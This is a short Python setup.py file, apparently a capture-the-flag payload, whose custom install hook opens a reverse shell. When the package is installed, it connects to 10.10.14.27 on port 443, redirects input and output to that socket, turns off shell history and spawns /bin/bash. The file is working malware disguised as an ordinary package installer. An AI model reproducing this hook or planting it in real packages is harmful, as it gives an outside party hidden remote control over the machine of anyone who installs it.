import os
import pty
import socket

from setuptools import setup
from setuptools.command.install import install

class MyClass(install):
    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.10.14.27", 443))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        os.putenv("HISTFILE",'/dev/null')
        pty.spawn("/bin/bash")
        s.close()
	
setup(
    cmdclass={
        "install": MyClass
    }
)
